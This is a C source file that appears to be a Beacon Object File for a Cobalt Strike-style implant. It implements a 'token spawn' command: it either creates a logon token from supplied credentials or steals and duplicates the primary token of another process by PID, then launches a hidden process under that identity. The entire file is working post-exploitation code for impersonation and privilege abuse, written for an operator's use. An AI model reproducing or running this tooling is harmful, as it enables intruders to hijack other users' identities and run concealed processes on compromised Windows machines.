#include <windows.h>
#include <winternl.h>
#include "../_include/beacon.h"

// Token Spawn - Creates a new process with a Primary Token
// Supports both token make (from credentials) and token steal (from process)

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

WINBASEAPI WINBOOL WINAPI ADVAPI32$LogonUserW(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);
WINBASEAPI WINBOOL WINAPI ADVAPI32$CreateProcessAsUserW(HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI BOOL    WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINADVAPI  WINBOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
WINBASEAPI HANDLE  WINAPI KERNEL32$GetProcessHeap();
WINBASEAPI LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
WINBASEAPI BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);
DECLSPEC_IMPORT int __cdecl MSVCRT$wcslen(const wchar_t *str);

WINBASEAPI NTSTATUS NTAPI NTDLL$NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
WINBASEAPI NTSTATUS NTAPI NTDLL$NtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
WINBASEAPI NTSTATUS NTAPI NTDLL$NtDuplicateToken(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN EffectiveOnly, TOKEN_TYPE TokenType, PHANDLE NewTokenHandle);
WINBASEAPI ULONG    NTAPI NTDLL$RtlNtStatusToDosError(NTSTATUS Status);
WINBASEAPI NTSTATUS NTAPI NTDLL$NtClose(HANDLE Handle);

BOOL TokenIsElevated(HANDLE hToken)
{
    BOOL result = FALSE;
    if (hToken) {
        TOKEN_ELEVATION Elevation = {0};
        DWORD eleavationSize = sizeof(TOKEN_ELEVATION);
        ADVAPI32$GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &eleavationSize);
        result = Elevation.TokenIsElevated;
    }
    return result;
}

VOID go(IN PCHAR Buffer, IN ULONG Length)
{
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);

    int action = BeaconDataInt(&parser);  // 0 = make from creds, 1 = steal from pid
    WCHAR *program = BeaconDataExtract(&parser, NULL);
    WCHAR *arguments = BeaconDataExtract(&parser, NULL);

    HANDLE hToken = NULL;
    BOOL success = FALSE;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Token Spawn - Create process with Primary Token\n");

    if (action == 0)  // Make token from credentials
    {
        WCHAR *username = BeaconDataExtract(&parser, NULL);
        WCHAR *password = BeaconDataExtract(&parser, NULL);
        WCHAR *domain = BeaconDataExtract(&parser, NULL);
        ULONG logonType = BeaconDataInt(&parser);
        ULONG logonProvider = LOGON32_PROVIDER_WINNT50;

        if (!username || !password || !domain)
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Invalid credentials\n");
            return;
        }

        if (logonType < 2 || logonType > 11)
        {
            logonType = LOGON32_LOGON_INTERACTIVE;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Creating token from credentials: %ls\\%ls (logon type: %d)\n", domain, username, logonType);

        if (!ADVAPI32$LogonUserW(username, domain, password, logonType, logonProvider, &hToken))
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create token from credentials. Error: %d\n", KERNEL32$GetLastError());
            return;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully created Primary Token from credentials\n");
        success = TRUE;
    }
    else if (action == 1)  // Steal token from process
    {
        DWORD pid = BeaconDataInt(&parser);

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Stealing Primary Token from process: %d\n", pid);

        OBJECT_ATTRIBUTES ObjAttr = {sizeof(ObjAttr)};
        CLIENT_ID Client = {0};
        HANDLE hProcess = NULL;

        Client.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
        NTSTATUS NtStatus = NTDLL$NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &ObjAttr, &Client);

        if (!NT_SUCCESS(NtStatus) || !hProcess)
        {
            ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open process. Error: %d\n", error);
            return;
        }

        HANDLE hStolenToken = NULL;
        NtStatus = NTDLL$NtOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_PRIVILEGES, &hStolenToken);

        if (!NT_SUCCESS(NtStatus) || !hStolenToken)
        {
            ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open token. Error: %d\n", error);
            NTDLL$NtClose(hProcess);
            return;
        }

        // Duplicate as Primary Token
        OBJECT_ATTRIBUTES ObjAttr2;
        InitializeObjectAttributes(&ObjAttr2, NULL, 0, NULL, NULL);

        NtStatus = NTDLL$NtDuplicateToken(hStolenToken, TOKEN_ALL_ACCESS, &ObjAttr2, FALSE, TokenPrimary, &hToken);

        NTDLL$NtClose(hStolenToken);
        NTDLL$NtClose(hProcess);

        if (!NT_SUCCESS(NtStatus) || !hToken)
        {
            ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to duplicate token as Primary. Error: %d\n", error);
            return;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully duplicated Primary Token from process\n");
        success = TRUE;
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid action\n");
        return;
    }

    if (success && hToken)
    {
        // Check if token is elevated
        BOOL elevated = TokenIsElevated(hToken);
        if (elevated)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Token is elevated\n");
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Token is not elevated\n");
        }

        // Build command line
        WCHAR commandLine[2048];
        int offset = 0;
        
        // Copy program path
        int progLen = MSVCRT$wcslen(program);
        for (int i = 0; i < progLen && i < 1000; i++)
        {
            commandLine[offset++] = program[i];
        }

        // Add space if arguments exist
        if (arguments && MSVCRT$wcslen(arguments) > 0)
        {
            commandLine[offset++] = L' ';
            
            // Copy arguments
            int argLen = MSVCRT$wcslen(arguments);
            for (int i = 0; i < argLen && offset < 2047; i++)
            {
                commandLine[offset++] = arguments[i];
            }
        }
        
        commandLine[offset] = L'\0';

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Spawning process: %ls\n", commandLine);

        STARTUPINFOW si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        // Use CreateProcessAsUserW instead of CreateProcessWithTokenW
        // This doesn't require SE_INCREASE_QUOTA_NAME privilege
        if (ADVAPI32$CreateProcessAsUserW(hToken, NULL, commandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully spawned process with Primary Token\n");
            BeaconPrintf(CALLBACK_OUTPUT, "[+] PID: %d\n", pi.dwProcessId);

            KERNEL32$CloseHandle(pi.hProcess);
            KERNEL32$CloseHandle(pi.hThread);
        }
        else
        {
            DWORD error = KERNEL32$GetLastError();
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to spawn process. Error: %d\n", error);
            
            if (error == 1314)
            {
                BeaconPrintf(CALLBACK_ERROR, "[-] Insufficient privileges. Try with elevated token or admin rights.\n");
            }
        }

        KERNEL32$CloseHandle(hToken);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Token spawn operation completed\n");
}

